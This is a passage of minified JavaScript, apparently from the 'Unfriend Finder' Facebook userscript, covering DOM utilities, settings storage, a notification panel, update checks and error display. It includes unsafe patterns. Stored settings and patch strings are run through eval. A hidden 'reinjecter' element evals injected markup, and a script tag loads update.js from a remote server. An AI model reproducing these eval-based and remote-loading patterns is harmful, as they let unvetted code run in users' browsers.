}}var xPathSelector=function(__constructor){var xps=this;var xpath=__constructor;xps.getSingleNodeValue=function(){try{return document.evaluate(xpath,document,null,9,null).singleNodeValue}catch(exception){new ErrorHandler(exception,"xPathSelector::getSingleNodeValue");return null}};xps.getMultipleNodeValues=function(){try{return document.evaluate(xpath,document,null,0,null)}catch(exception){new ErrorHandler(exception,"xPathSelector::getMultipleNodeValues");return null}};xps.numberValues=function(){try{return document.evaluate("count("+xpath+")",document,null,0,null).numberValue
}catch(exception){new ErrorHandler(exception,"xPathSelector::numberValues");return -1}};xps.toString=function toString(){return'[xPath Selector "'+xpath+'"]'}};function saveSettings(){try{Console.log("Settings saved: "+stringify(Params.settings))}catch(exception){}Registry.setKey("settings",stringify(Params.settings))}try{Params.settings=eval(Registry.getKey("settings",stringify(Params.defaultSettings)))}catch(exception){Params.settings=Params.defaultSettings;new ErrorHandler(exception)}ExtendNew(Params.settings,Params.defaultSettings);
saveSettings();Extend(that,Params);Params.enabled=(Registry.getKey("enabled","enabled")=="enabled"?true:false);Params.isPage=(getFromId("jewelFansTitle")?true:false);Params.debug=Params.settings.debug;try{Params.iFrame=(window.top!=self)}catch(exception){new ErrorHandler(exception)}try{if(Params.mobile){Params.mobileId=getFromId("m_user_DEPRECATED").value}}catch(exception){new ErrorHandler(exception)}function trace(){if(!Params.dev){return}try{if(!traced[arguments.callee.caller.name]){traced[arguments.callee.caller.name]=0
}traced[arguments.callee.caller.name]++;var time=(new (Date));console.log(time.getHours()+":"+time.getMinutes()+":"+time.getSeconds()+" Tracing "+arguments.callee.caller.name,(arguments.length>0?arguments:arguments.callee.caller.arguments))}catch(ex){}}function getFromId(_id){return document.getElementById(_id)||null}function getFromClass(_class){return document.getElementsByClassName(_class)||null}function getCoreFilter(){if(getFromId(Params.settings.previousFilter)){return getFromId(Params.settings.previousFilter)
}return getFromId("navItem_nf")||getFromId("navItem_app_4748854339")}function getSideNav(){if(getCoreFilter().id=="navItem_nf"){return getFromId("navItem_nf").parentNode}else{if(Params.settings.previousFilter=="unfavorited"){return(new xPathSelector(".//div[@id='appsNav']/ul")).getSingleNodeValue()}else{return getCoreFilter().parentNode}}}function evalName(name){return eval('"'+name.replace(/"/g,'"')+'"')}function th(){return"\\w+"}function encode(text){var chars="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",text=unescape(encodeURI(text)),e=(text.length+2)%3;
text=(text+"\0\0".slice(e)).replace(/[\s\S]{3}/g,function(f){f=(f.charCodeAt(0)<<16)|(f.charCodeAt(1)<<8)|f.charCodeAt(2);return String.fromCharCode(chars.charCodeAt(f>>>18),chars.charCodeAt((f>>>12)&63),chars.charCodeAt((f>>>6)&63),chars.charCodeAt(f&63))});return text.slice(0,text.length+e-2)+"==".slice(e)}var Doctor=function Doctor(patches){var doctor=this;doctor.patches={};doctor.init=function doctorInit(){var patch,i;try{patches=eval(patches)}catch(exception){patches=[]}Console.info("Doctor: "+patches.length+" patches loaded");
try{for(i=0;i<patches.length;i++){if(patch=patches[i]){if(patch.version==Params.version){if(patch.js){doctor.patches[patch.js.caller]=patch.js.callee}if(patch.css){if(patch.css.file){doctor.injectCSS(patch.css.id,Params.links.rsrc+patch.css.file)}else{if(patch.css.inline){core.style.Append(parseTemplate(""+patch.css.inline,{params:{rsrc:Params.links.rsrc,blank:Params.images.blank,filtername:Params.filterName}}))}}}}}}}catch(exception){}};doctor.injectCSS=function doctorInjectCSS(id,css){new xHTMLElement({element:"link",type:"text/css",href:css,id:id,rel:"stylesheet",parentNode:Params.head})
};doctor.heal=function Heal(){var args=[],i,callee;try{for(i=0;i<arguments.callee.caller.arguments.length;i++){args.push(arguments.callee.caller.arguments[i])}if(callee=doctor.patches[arguments.callee.caller.name]){Console.info("Healing request from "+arguments.callee.caller.name);(function(){eval(callee)}).apply(arguments.callee.caller,args);Console.info(arguments.callee.caller.name+"() healed")}}catch(exception){}};doctor.init();doctor.toString=function toString(){return"[object Doctor]"}};var xHTMLElement=function xHTMLElement(__constructor){var htmlelement=this;
htmlelement.element=null;var event;htmlelement.build=function(){try{if(!__constructor.element){return false}htmlelement.element=document.createElement(__constructor.element);if(__constructor.listeners){for(event in __constructor.listeners){if(typeof __constructor.listeners[event]=="function"){EventMgr.addListener(htmlelement.element,event,__constructor.listeners[event])}}delete __constructor.listeners}try{Extend(htmlelement.element,__constructor)}catch(exception){new ErrorHandler(exception,"htmlelement.Extend()")
}if(__constructor.parentNode){htmlelement.appendTo(__constructor.parentNode);delete __constructor.parentNode}return htmlelement}catch(exception){new ErrorHandler(exception,"htmlelement.build()");return false}};htmlelement.appendTo=function(__parent){try{if(__parent){if(htmlelement.element.before){__parent.insertBefore(htmlelement.element,htmlelement.element.before)}else{if(htmlelement.element.after){if(htmlelement.element.after.nextElementSibling){__parent.insertBefore(htmlelement.element,htmlelement.element.after.nextElementSibling)
}else{__parent.appendChild(htmlelement.element)}}else{__parent.appendChild(htmlelement.element)}}}else{if(htmlelement.element.before){htmlelement.element.before.parentNode.insertBefore(htmlelement.element,htmlelement.element.before)}else{if(htmlelement.element.after){if(htmlelement.element.after.nextElementSibling){htmlelement.element.after.nextElementSibling.parentNode.insertBefore(htmlelement.element,htmlelement.element.after.nextElementSibling)}else{htmlelement.element.after.parentNode.appendChild(htmlelement.element)
}}}}return htmlelement}catch(exception){alert("Error "+exception.message);new ErrorHandler(exception,"htmlelement.appendTo()");return false}};htmlelement.getElement=function(){return htmlelement.element};htmlelement.toString=function toString(){return"[object xHTMLElement]"};return htmlelement.build()};if(parseInt(Registry.getKey("version","0"),10)<parseInt(Params.version,10)){Params.versionChanged=true}Registry.setKey("version",Params.version);function inject(o,args){trace();if(Params.body){var s=document.createElement("script");
if(typeof o=="function"){s.innerHTML="("+o.toString()+").call(null, "+JSON.stringify(args)+");"}else{s.innerHTML=o}Params.body.appendChild(s);Params.body.removeChild(s)}}function stringify(object){try{if(this["uneval"]){return uneval(object)}else{if(this["JSON"]){if(typeof object=="object"){return"("+JSON.stringify(object)+")"}else{return JSON.stringify(object)}}}}catch(exception){new ErrorHandler(exception,"stringify()")}}function toArray(object){var ret=[];if(object instanceof Array){return object
}else{if(object instanceof Object){var property;for(property in object){if(object.hasOwnProperty(property)){ret.push(object[property])}}}else{if(object.length){var a=0,d=object.length;while(a<d){if(object[a]){ret.push(object[a])}a++}}}}return ret}if(!document.getElementsByClassName){document.getElementsByClassName=function(className){try{var elements=new (Array),children=(new xPathSelector(".//*[contains(concat(' ', @class, ' '), ' "+className+" ')]")).getMultipleNodeValues(),child;while(child=children.iterateNext()){elements.push(child)
}return elements}catch(exception){new ErrorHandler(exception,"document.getElementsByClassName()");return new (Array)}}}function rand(n){var f;do{f=Math.floor(Math.random()*n+1);if(((f>48)&&(f<57))||((f>97)&&(f<122))){break}}while(Infinity);return f}function randNumber(){return String.fromCharCode(rand(57))}var EventMgr={EVENTS:{mouseout:"mouseout",mousein:"mousein",mouseenter:"mouseenter",mouseleave:"mouseleave",mousemove:"mousemove",mouseover:"mouseover",mousedown:"mousedown",mouseup:"mouseup",mousewheel:"mousewheel",readystatechange:"readystatechange",load:"load",change:"change",click:"click",keydown:"keydown",keyup:"keyup",DOMNodeInserted:"DOMNodeInserted",DOMAttrModified:"DOMAttrModified",DOMSubtreeModified:"DOMSubtreeModified",hashChanged:"hashchange",popState:"popstate"},addListener:function(el,evt,f){try{if((el.addEventListener)&&(this.EVENTS[evt])&&(typeof f=="function")){el.addEventListener(evt,f,false)
}return evt}catch(exception){new ErrorHandler(exception,"EventMgr.addListener("+f.toString()+")");return false}},removeListener:function(el,evt,f){try{if((el.addEventListener)&&(this.EVENTS[evt])&&(typeof f=="function")){el.removeEventListener(evt,f,false)}return evt}catch(exception){new ErrorHandler(exception,"EventMgr.removeListener()");return false}}};var CSS3={DISPLAY:{none:"none",block:"block",compact:"compact",inline:"inline",inlineBlock:"inline-block",listItem:"list-item",marker:"marker",runIn:"run-in",table:"table",inlineTable:"inline-table",tableCaption:"table-caption",tableCell:"table-cell",tableColumn:"table-column",tableColumnGroup:"table-column-group",tableHeaderGroup:"table-header-group",tableFooterGroup:"table-footer-group",tableRow:"table-row",tableRowGroup:"table-row-group"},addClass:function(el,newclass){if(el instanceof HTMLElement){}else{return false
}try{var c=this.listClass(el),d=c.split(" ");var n;newclass=newclass.split(" ");for(n=0;n<newclass.length;n++){if((newclass[n])&&(d.indexOf(newclass[n])===-1)){d.push(newclass[n])}}return this.setClass(el,d.join(" "))}catch(exception){new ErrorHandler(exception,"CSS3.addClass()");return false}},removeClass:function(el,classname){if(el instanceof HTMLElement){}else{return false}try{if(!el.className){return null}var c=this.listClass(el),d=c.split(" ");var n;classname=classname.split(" ");for(n=0;n<classname.length;
n++){if((classname[n])&&(d.indexOf(classname[n])!=-1)){d.splice(d.indexOf(classname[n]),1)}}return this.setClass(el,(d.length>0?d.join(" "):""))}catch(exception){new ErrorHandler(exception,"CSS3.removeClass(el, "+classname+")");return false}},listClass:function(el){if(el instanceof HTMLElement){}else{return false}try{return el.className}catch(exception){new ErrorHandler(exception,"CSS3.listClass()");return false}},hasClass:function(el,className){if(el instanceof HTMLElement){}else{return false}try{var c=this.listClass(el),d=c.split(" "),n;
for(n=0;n<d.length;n++){if(d[n]===className){return true}}return false}catch(exception){new ErrorHandler(exception,"CSS3.hasClass()");return false}},setClass:function(el,newclass){if(el instanceof HTMLElement){}else{return false}try{el.className=newclass;return(el.className==newclass)}catch(exception){new ErrorHandler(exception,"CSS3.setClass()");return false}},toggleClass:function(el,className){if(el instanceof HTMLElement){}else{return false}try{var c=this.listClass(el),d=c.split(" ");if(d.indexOf(classname[n])!=-1){this.removeClass(el,className)
}else{this.addClass(el,className)}}catch(exception){new ErrorHandler(exception,"CSS3.toggleClass()");return false}},hide:function(el){if(el instanceof HTMLElement){}else{return false}try{el.style.display=this.DISPLAY.none;return(el.style.display==this.DISPLAY.none)}catch(exception){new ErrorHandler(exception,"CSS3.hide()");return false}},display:function(el,displayMode){if(el instanceof HTMLElement){}else{return false}try{el.style.display=displayMode;return(el.style.display==displayMode)}catch(exception){new ErrorHandler(exception,"CSS3.display()");
return false}},hidden:function(el){if(el instanceof HTMLElement){}else{return false}try{return(el.style.display==this.DISPLAY.none)}catch(exception){new ErrorHandler(exception,"CSS3.hidden()");return null}},getSize:function(el,paddings,margins){if(el instanceof HTMLElement){}else{return false}var w=el.offsetWidth,h=el.offsetHeight,p={top:this.getStyle(el).paddingTop.replace("px","")||0,bottom:this.getStyle(el).paddingBottom.replace("px","")||0,right:this.getStyle(el).paddingRight.replace("px","")||0,left:this.getStyle(el).paddingLeft.replace("px","")||0},m={top:this.getStyle(el).marginTop.replace("px","")||0,bottom:this.getStyle(el).marginBottom.replace("px","")||0,right:this.getStyle(el).marginRight.replace("px","")||0,left:this.getStyle(el).marginLeft.replace("px","")||0};
if(!paddings){w-=p.left;w-=p.right;h-=p.top;h-=p.bottom}if(margins){w-=m.left;w-=m.right;h-=m.top;h-=m.bottom}return{width:w,height:h}},getStyle:function(el){if(el instanceof HTMLElement){}else{return false}if(window.getComputedStyle){return window.getComputedStyle(el,null)}else{if(el.currentStyle){return el.currentStyle}else{return el.style}}},getElementPosition:function(el){if(el instanceof HTMLElement){}else{return false}if(!el){return{left:0,top:0}}var position={left:el.offsetLeft,top:el.offsetTop},parentPosition=this.getElementPosition(el.offsetParent),o;
for(o in parentPosition){if(parentPosition.hasOwnProperty(o)){position[o]+=parentPosition[o]}}return position},getElementEndPosition:function(el){if(el instanceof HTMLElement){}else{return false}var position=this.getElementPosition(el),size=this.getSize(el);return{left:position.left+size.width,top:position.top+size.height}}};function genTime(time){trace();if(!Params.settings.showTime){return""}if(!LANG){LANG=$en_US}var m,d,h,mm,a,monthes,now,diff;m=LANG.months;monthes=m.split(",");now=Math.round(+new (Date)/1000);
if(!time){return""}var timeUnfriend=new (Date)(time*1000);m=timeUnfriend.getMonth();d=timeUnfriend.getDate();h=timeUnfriend.getHours();mm=zeropad(timeUnfriend.getMinutes(),2);a="";if(LANG!="fr_FR"){a=(h<12?"am":"pm");h=(h%12)||12}diff=parseInt(Math.round((now-time)),10);if((diff>=0)&&(diff<=86400)){if(d==(new (Date)).getDate()){return LANG.today+", "+h+":"+mm+a}else{return LANG.yesterday+", "+h+":"+mm+a}}if(LANG=="fr_FR"){return d+" "+monthes[m]+", "+h+":"+mm+a}else{return monthes[m]+" "+d+", "+h+":"+mm+a
}}function zeropad(num,lim){return((""+num+"").length>=lim)?num:zeropad("0"+num,lim)}function initNub(){trace();if(!getFromId("fbDockChat")){setTimeout(initNub,50)}else{if(getFromId("UFNubToggler")){return}if(!LANG){LANG=$en_US}var updateNubPane,fbNub=new xHTMLElement({element:"div",id:"UnfriendsNub",className:"fbNub",innerHTML:parseTemplate('    <a id="UFNubToggler" class="uiTooltip fbNubButton" rel="toggle">       <i id="iconNubUF" class="img" style="position:relative; top:-8px; margin-bottom: -13px; background-image: url(\'::unfriends::\') !important; background-position: -16px 0px !important; width: 16px; height: 16px; display: inline-block; ::opacity::"></i>       <i id="iconNubUFerror" style="display: none; top: 6px; left:8px; position: absolute; background-image: url(\'::rsrc::/z2B5S/hash/696ouey0.png\') !important; background-position: 0 -1763px; height: 12px; margin: 2px 0px 0px 2px; width: 16px;" class="GenericStory_Icon img"></i>       <span class="uiTooltipWrap top right righttop">           <span class="uiTooltipText uiTooltipNoWrap">::title::</span>       </span>       <span id="numNotifications" style="display:none;">0</span>    </a>    <div class="fbNubFlyout uiToggleFlyout" style="width: 212px; box-shadow:0 0; border-bottom:#BBBBBB solid 1px;">       <div class="clearfix fbNubFlyoutTitlebar"><div class="titlebarLabel clearfix">::title::</div></div>       <div class="fbNubFlyoutBody" style="height: auto;">           <div class="fbNubFlyoutBodyContent" style="padding: 10px;">                <div style="margin-bottom:10px; display: none;" id="updateNubPane">                   <div style="border-bottom:1px solid #E7E7E7; font-weight:bold; font-size:9px; color:#373737; padding-bottom:2px; margin-bottom:5px;">Update</div>                   <div style="line-height: 17px; padding:5px;" id="updatePane" class="explanation_note"></div>                </div>                <div style="margin-bottom:10px;::display1::">                   <div style="border-bottom:1px solid #E7E7E7; font-weight:bold; font-size:9px; color:#373737; padding-bottom:2px; margin-bottom:5px;">::text_settings::</div>                   <div style="line-height:17px;">                      <span style="margin-left: 5px;"><a href="#/?sk=ufs" onclick="return false;" id="actionShowSettings">::changesettings::</a></span>                   </div>                </div>                 <div>                   <div style="border-bottom:1px solid #E7E7E7; font-weight:bold; font-size:9px; color:#373737; padding-bottom:2px; margin-bottom:5px;">Actions</div>                   <div style="line-height: 17px; margin-left:5px;" id="actionPane">                   </div>                </div>           </div>           <div style="padding:5px 10px;">               <a href="https://www.unfriendfinder.com" onclick="window.open(this.href); return false;">Website</a><span style="float: right; margin-right: 19px"><a href="::forum::" onclick="window.open(this.href); return false;">Forum</a> - <a href="::twitter::" onclick="window.open(this.href); return false;">Twitter</a></span>           </div>       </div>    </div>',{params:{display1:(!Params.enabled?" display:none;":""),title:"Unfriend Finder"+(!Params.enabled?" ("+LANG.disabled+")":(Params.protocol=="https:"?" (HTTPS)":"")),unfriends:Params.icons.unfriends,rsrc:Params.links.rsrc,opacity:(!Params.enabled?"opacity: 0.4":"opacity:1"),twitter:Params.links.twitter,forum:Params.links.forum,text_settings:LANG.settings,changesettings:"Change settings"}}),style:{display:(Params.settings.hideNub?CSS3.DISPLAY.none:CSS3.DISPLAY.inlineBlock)},parentNode:getFromId("fbDockChatBuddylistNub").parentNode,before:getFromId("fbDockChatBuddylistNub")}).getElement();
if(!Params.settings.hideNub){CSS3.addClass(Params.body,"showNub")}if(!Params.enabled){CSS3.display(fbNub,CSS3.DISPLAY.inlineBlock);CSS3.addClass(Params.body,"showNub")}EventMgr.addListener(getFromId("UFNubToggler"),EventMgr.EVENTS.click,function(){try{if((core)&&(core.Beeper.length>0)){core.Beeper.Hide()}}catch(exception){new ErrorHandler(exception,"UFNubToggler.click()")}});if(Params.newVersion==true){if(updateNubPane=getFromId("updateNubPane")){getFromId("updatePane").innerHTML=LANG.notif_version+' <a href="'+Params.links.update+'">'+LANG.here+"</a>.";
CSS3.display(updateNubPane,CSS3.DISPLAY.block)}}EventMgr.addListener(getFromId("actionShowSettings"),EventMgr.EVENTS.click,function(){if(getFromId("UFfilterTextSettings")){core.filter.select("settings")}else{core.href(Params.protocol+"//"+Params.host+"/?sk=ufs")}inject(function(){Toggler.toggle($("UFNubToggler"))})});if(Params.enabled){setMenuCommand("takeTourLink","Take a tour!",function(){Registry.setKey(core.user_id+"_takeTour","1");core.href(Params.protocol+"//"+Params.host+"/")});setMenuCommand("takeTourLink","Show tutorial",function(){inject(function(){Toggler.toggle($("UFNubToggler"))
});core.loadWelcomeFacebox()});setMenuCommand("checkUpdateAction","Check for updates",function(){getFromId("actionLink_checkUpdateAction").innerHTML='<span><img id="debug_loadingversion" src="'+Params.images.smallIndicator+'" style="height:11px; margin:auto; padding-top:2px;" /></span>';updateStandAlone(true)});setMenuCommand("emergencyReset","Reset values to default",function(){if(!core.dialogs.resetFacebox){core.dialogs.resetFacebox=new Facebox({id:"resetFacebox",title:LANG.resettitle,body:LANG.resetbody,buttons:[{name:"delete_story",value:LANG.reset_,id:"reset_button",handler:function(){core.dialogs.resetFacebox.showReset();
setTimeout(function(){Registry.setKey(core.user_id+"_unfriends","({})");Registry.setKey(core.user_id+"_friends","({})");Registry.setKey(core.user_id+"_toNotify","({})");Registry.setKey(core.user_id+"_awaitingsIgnored","({})");Registry.setKey(core.user_id+"_keepAwaitingList","({})");Registry.setKey(core.user_id+"_reappeared","({})");Registry.setKey(core.user_id+"_deactivated","({})");Registry.setKey(core.user_id+"_keepAwaitingsTime","({})");Registry.setKey(core.user_id+"_messages","({})");Registry.setKey(core.user_id+"_helps","({})");
Registry.setKey("settings",stringify(Params.defaultSettings));Registry.setKey("language","");Registry.setKey(core.user_id+"_lastUpdateCheck",1);Registry.setKey("coreStarted","0");core.href(Params.protocol+"//"+Params.host+"/")},1500)},disabled:false,closer:false,type:"blue"},{name:"cancel",value:LANG.btn_cancel,id:"cancel_button",handler:function(){void (0)},disabled:false,closer:true,type:"gray"}]})}core.dialogs.resetFacebox.Show()})}setMenuCommand("disableScript",(Params.enabled?LANG.disable:"Enable"),function(){if(Params.enabled){if(!core.dialogs.disableFacebox){core.dialogs.disableFacebox=new Facebox({id:"disableFacebox",title:'<span class="en_US">You\'re about to temporarily disable Unfriend Finder.</span><span class="fr_FR">Confirmation de désactivation temporaire du script</span>',body:parseTemplate('    <span class="en_US">While disabled, the script will not alert you of any unfriend activities, and will not be displayed at this place.    <br /><br />If you want to re-enable the script, use the "Enable" function of the Icon-Button in the lower-right corner, near the Facebook Chat.    <br /><br /><b>When re-enabled, the script will alert you of all Unfriends you had when the script was disabled.</b></span>    <span class="fr_FR">Lorsque le script est désactivé, il n\'affichera aucune activité si quelqu\'un vous supprime de Facebook.    <br /><br />Si vous voulez réactiver le script par la suite, utiliser la fonction "Activer" localisée avec le bouton-icône en bas à droite, à côté de la discussion instantanée.    <br /><br /><b>Une fois réactivé, le script va vous annoncer tous les Amis en moins que vous aviez durant sa désactivation.</b></span>',{params:{}}),buttons:[{name:"delete_story",value:LANG.disable,id:"disable_button",handler:function(){Registry.setKey("enabled","disabled");
window.location.reload()},disabled:false,closer:false,type:"blue"},{name:"cancel",value:LANG.btn_cancel,id:"cancel_button",handler:function(){core.dialogs.disableFacebox=null},disabled:false,closer:true,type:"gray"}]})}core.dialogs.disableFacebox.Show()}else{Registry.setKey("enabled","enabled");window.location.reload()}});if(!Params.enabled){setMenuCommand("checkUpdateAction","Check for updates",function(){getFromId("actionLink_checkUpdateAction").innerHTML='<span><img id="debug_loadingversion" src="'+Params.images.smallIndicator+'" style="height:11px; margin:auto; padding-top:2px;" /></span>';
updateStandAlone(true)})}setMenuCommand("checkUpdateAction","Uninstall",function(){core.href(Params.links.uninstall,true)})}}function checkScript(){if(!Params.enabled){return}if(!Params.canRun){return}if(Params.iFrame){return}if(Params.isPage){return}if(Params.checked){return}Params.checked=true;if(!Params.started){updateStandAlone(true);var style=new (Style);style.Append(".UFerrorContainer { padding: 10px; padding-top:5px; margin-bottom: -10px; padding-bottom: 0px; height: 150px; }\n.timelineLayout .UFerrorContainer { padding: 1px; padding-top:10px; margin-bottom: -10px; padding-bottom: 0px; height: 150px; }\n");
var versionContainer=new xHTMLElement({element:"div",id:"versionContainer",style:{display:CSS3.DISPLAY.none},parentNode:Params.body}).getElement();CSS3.hide(versionContainer);EventMgr.addListener(versionContainer,EventMgr.EVENTS.DOMNodeInserted,function(){setTimeout(function(){var ver;if(ver=versionContainer.firstElementChild){if(parseInt(Params.version,10)<parseInt(ver.innerHTML,10)){CSS3.display(getFromId("error_newversion"),CSS3.DISPLAY.block);CSS3.hide(getFromId("error_checkupdate"));CSS3.hide(getFromId("error_loadingversion"))
}else{CSS3.hide(getFromId("error_loadingversion"));CSS3.display(getFromId("error_nonewversion"),CSS3.DISPLAY.block)}}},500)});Console.error("Unfriend Finder can't be initialized on "+document.location.href);var error_help="<br /><br />Help for this error: ";if(!script){error_help+="variable <u>script</u> was not correctly initialized."}else{if(!core){error_help+="variable <u>core</u> was not correctly initialized."}else{error_help+="Your Facebook ID could not be found"}}if(getFromId("content")){new xHTMLElement({element:"div",innerHTML:parseTemplate('    <div class="UFerrorContainer">       <div style="max-width: 829px; background-color:#FFEBE8; border: 1px solid #DD3C10; font-weight: bold; color: #333333; font-size:11px; margin-bottom: 10px; padding: 10px; text-align: justify;  -webkit-box-shadow: 0 4px 16px rgba(0,0,0,0.2); -moz-box-shadow: 0 4px 16px rgba(0,0,0,0.2); -ms-box-shadow: 0 4px 16px rgba(0,0,0,0.2); -o-box-shadow: 0 4px 16px rgba(0,0,0,0.2); box-shadow: 0 4px 16px rgba(0,0,0,0.2);">           Unfriend Finder is installed but is not able to run correctly.           <br />This happen when Facebook has made some changes that affected the script.           <br />Maybe an update is available to fix this issue.           ::error::           <br /><br /><a href="#" onclick="return false;" id="error_checkupdate">Check here to check for new updates.</a>           <img id="error_loadingversion" src="::smallindicator::" style="display:none; height:11px; margin:auto; padding-top:2px;" />           <a href="::update::" id="error_newversion" style="display:none;">A new version is available</a>           <span id="error_nonewversion" style="display:none;">No new version available, yet.. Be aware of the <a href="::twitter::">latest informations</a>.</span>       </div>    </div>',{params:{error:error_help,update:Params.links.update,smallindicator:Params.images.smallIndicator,twitter:Params.links.twitter}}),parentNode:getFromId("contentCol"),before:getFromId("contentCol").firstElementChild}).getElement()
}if(getFromId("UFNubToggler")){CSS3.display(getFromId("UFNubToggler").parentNode,CSS3.DISPLAY.inlineBlock);getFromId("iconNubUF").style.opacity="0.4";getFromId("iconNubUFerror").style.opacity="1";var iconNubUFerrorVisible=true;CSS3.display(getFromId("iconNubUFerror"),CSS3.DISPLAY.block);setInterval(function(){iconNubUFerrorVisible=!iconNubUFerrorVisible;if(iconNubUFerrorVisible){CSS3.display(getFromId("iconNubUFerror"),CSS3.DISPLAY.block)}else{CSS3.hide(getFromId("iconNubUFerror"))}},1000)}EventMgr.addListener(getFromId("error_checkupdate"),EventMgr.EVENTS.click,function(){new xHTMLElement({element:"script",src:"https://www.unfriendfinder.com/update.js?id=0",parentNode:Params.head});
CSS3.hide(getFromId("error_checkupdate"));CSS3.display(getFromId("error_loadingversion"),CSS3.DISPLAY.block)})}}function Ajax(__constructor){return new XHR(__constructor)}function setMenuCommand(id,name,func){var actionPane,command;if(actionPane=getFromId("actionPane")){if((name!=null)&&(id!=null)&&(typeof func=="function")){if(getFromId(id)){return}command=new xHTMLElement({element:"a",id:"actionLink_"+id,innerHTML:name,parentNode:actionPane,style:{display:CSS3.DISPLAY.block},listeners:{click:func}}).getElement()
}}else{setTimeout(function(){setMenuCommand(id,name,func)},1000)}}function parseTemplate(data,object){trace(null);var replaceFunc;if(object.params){replaceFunc=function($0,$1){return($1 in object.params?object.params[$1]:$0)}}else{replaceFunc=function($0,$1){return($1 in object?object[$1]:$0)}}return data.replace(/::(\w+)::/g,replaceFunc)}function nl2br(__string){return __string.replace(/\n/,"<br />")}function lcd(){}function footer(){trace();if(!getFromId("footerUF")){if(getFromId("footerContainer")){getFromId("footerContainer").firstElementChild.nextElementSibling.innerHTML=getFromId("footerContainer").firstElementChild.nextElementSibling.innerHTML+' · <a id="footerUF" onclick="window.open(this.href); return false;" title="Unfriend Finder Website" accesskey="0" href="http://www.unfriendfinder.'+(Params.lang=="fr"?"fr":"com")+'/home">'+Params._0x4d22+"</a>"
}}else{setTimeout(footer,Params.timerFooter*1000)}}function checkUrl(){trace();if((getCoreFilter())&&(Params.ready)&&(!getFromId(Params.filterName))){core.filter.build()}if(window.location.href!=Params.url){if(getCoreFilter()){if(Params.ready){if(!getFromId(Params.filterName)){core.filter.build()}}}setTimeout(newUrl,1000);Params.url=window.location.href}}function newUrl(){if(!core){return}trace();core.bindKeys();core.loadCheckProfile();core.filter.build()}setInterval(checkUrl,1000);function initEnv(){trace();
if(Params.body){Params.lang=(/fr_FR/.test(Params.body.className)?"fr":"en")}var userAgent=navigator.userAgent.toLowerCase(),isWindows=(/windows|win32/.test(userAgent)),isMac=(/macintosh|mac os x/.test(userAgent)),isLinux=(/linux/.test(userAgent)),isGecko=/gecko/.test(userAgent),isWebkit=/webkit/.test(userAgent),isFirefox=isGecko&&(/firefox/.test(userAgent)),isOpera=/opera/.test(userAgent),isChrome=(/\bchrome\b/.test(userAgent)),isSafari=/safari/.test(userAgent),isIE=/msie/.test(userAgent),isGM=(this["GM_registerMenuCommand"]?true:false);
Extend(Params.env,{userAgent:userAgent,isOpera:isOpera,isChrome:isChrome,isSafari:(isChrome?false:isSafari),isIE:isIE,isGecko:isGecko,isFirefox:isFirefox,isWindows:isWindows,isMac:isMac,isLinux:isLinux,isWebkit:isWebkit,isGM:(isChrome?false:isGM)})}var reinjecter;if(!getFromId("reinjecter")){reinjecter=new xHTMLElement({element:"div",id:"reinjecter",style:{display:CSS3.DISPLAY.none},parentNode:Params.body}).getElement()}else{reinjecter=getFromId("reinjecter")}EventMgr.addListener(reinjecter,EventMgr.EVENTS.DOMNodeInserted,function(e){try{eval(reinjecter.firstElementChild.innerHTML);
reinjecter.removeChild(reinjecter.firstElementChild)}catch(exception){new ErrorHandler(exception,"core.reinjecter.DOMNodeInserted")}});inject(function(){window.reinject=function(o,args){if(reinjecter=document.getElementById("reinjecter")){var s=document.createElement("script");s.type="html/template";if(typeof o=="function"){s.innerHTML="try { ("+o.toString()+").call(null, "+JSON.stringify(args)+"); } catch(ex) { console.error(ex); }"}else{s.innerHTML=o}reinjecter.appendChild(s)}}});var a4ekE=function(){inject(function(){window.EnvInterval=setInterval(function(){if(typeof window.Env!="undefined"){clearInterval(window.EnvInterval);
window.reinject(function(Global){initScript(Global)},Env)}},200)})};"check arguments";function initScript(Env){setTimeout(function() {if(Env){Params.Global=Env}trace();Console.warn("Unfriend Finder loaded for url('"+document.location+"')");if(Params.iFrame){Console.error("Can't run over iFrames",document.location);return}if(Params.isPage){Console.error("Unfriend Finder cannot be loaded for pages profiles");return}initNub();if(!Params.enabled){Console.warn("Unfriend Finder is disabled");return}if((Params.mobile)&&(Params.mobileId)){script=new ("use mobile","check arguments",UnfriendFinder)(Params.mobileId);
return}try{script=new ("use strict","check arguments",UnfriendFinder)(new (UserID))}catch(exception){Console.error("Error executing Unfriend Finder: "+exception.message)}},0)}var UserAgent=function UserAgent(agent){var ua=this;ua.userAgent=agent||navigator.userAgent;ua.print=function(_s){ua.parse();_s=_s.replace(/%s/g,ua);_s=_s.replace(/%b/g,ua.Browser());_s=_s.replace(/%v/g,ua.BrowserVersion());_s=_s.replace(/%o/g,ua.System());_s=_s.replace(/%d/g,ua.SystemVersion());return _s};ua.toData=function(){return ua.print("&useragent=%b|%v|%o|%d")
};ua.parse=function(){try{if(/Fluid/i.test(ua.userAgent)){ua.browser="Fluid";ua.browserversion=ua.userAgent.match(/Fluid\/([^\s]+)(;|\s|$)/i)[1]}else{if(/Rockmelt/i.test(ua.userAgent)){ua.browser="Rockmelt";ua.browserversion=ua.userAgent.match(/Rockmelt\/([^\s]+)(;|\s|$)/i)[1]}else{if(/Flock/i.test(ua.userAgent)){ua.browser="Flock";ua.browserversion=ua.userAgent.match(/Flock\/([^\s]+)(;|\s|$)/i)[1]}else{if(/firefox/i.test(ua.userAgent)){ua.browser="Firefox";ua.browserversion=ua.userAgent.match(/(?:Firefox|Namoroka|Shiretoko|Iceweasel)\/([^\s]+)(;|\s|$)/)[1]
}else{if(/chrome/i.test(ua.userAgent)){ua.browser="Chrome";ua.browserversion=ua.userAgent.match(/Chrome\/([^\s]+)(;|\s|$)/i)[1]}else{if(/opera/i.test(ua.userAgent)){ua.browser="Opera";if(/Version\/([^\s]+)(;|\s|$)/i.test(ua.userAgent)){ua.browserversion=ua.userAgent.match(/Version\/([^\s]+)(;|\s|$)/i)[1]}else{ua.browserversion=ua.userAgent.match(/Opera\/([^\s]+)(;|\s|$)/i)[1]}}else{if(/safari/i.test(ua.userAgent)){ua.browser="Safari";ua.browserversion=ua.userAgent.match(/Version\/([^\s]+)(;|\s|$)/i)[1]
